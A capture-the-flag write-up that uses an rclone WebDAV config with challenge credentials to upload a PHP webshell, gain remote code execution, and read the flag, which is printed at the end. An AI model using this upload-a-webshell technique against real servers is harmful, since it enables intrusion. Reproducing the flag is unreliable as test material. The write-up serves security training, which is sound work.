# Operation Eradication

### Challenge Description
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/39c2ff9f-65e4-4790-9af3-47741bcefe72)

### Solution
The provided file looks like a configuration file:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/1dd6c000-bb6e-4060-ab31-841092487e30)

We start by googling around to see if we can find what it is a configuration file for:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/fba257f6-9548-428e-b5d0-9d4ed340c0d0)

The first search result mentiones exactly the documentation that we need. It seems it is a configuration file for `rclone:`
https://rclone.org/webdav/

We need to adjust it a bit to be able to use it:  

```bash
[remote]
type = webdav
url = http://chal.ctf.games:31372/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Using this syntax, we can list the contents on this webserver:

```bash
rclone --config operation_eradication ls remote:
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/adc52e53-fe34-41a6-a99d-1ff5783159fc)

I spent some time going through these files but came up empty. Then I noticed that the website in question is a PHP website:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2cf4059e-d1ef-4f44-bf2d-5ba08e941e0d)

So I tried to copy a PHP webshell onto it:  

```bash
 rclone --config operation_eradication copy webshell.php remote:
```
No errors came up so I took it as a good sign, however, when I tried to access it, I get a Not Found error:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/180a758e-3b2b-4548-b6cb-d80f424e4535)

But if we list it, we can see our file:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/bd21f996-9842-4c33-9418-770488d22062)

So I tried again, but this time I used `http_proxy` to pass the request via Burpsuite and see what kind of request it's sending and how it looks like:  

```bash
http_proxy=http://127.0.0.1:8080 rclone --config operation_eradication copy shell.php remote:
```
Burpsuite shows a successful request and gives us something to work with:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/65f4b9ff-fa09-4ef3-9c2b-1e47323de796)

I sent it to Repeater and changed it to a get request to our webshell and we have RCE:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/085b5ef9-0372-40a9-b615-2198d64ae4d5)

I enumerated quite a while until I read the index.php source code and found the flag:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/814bb5f1-3db4-4f11-ab32-0c38d18c1491)

flag{564607375b731174f2c08c5bf16e82b4}
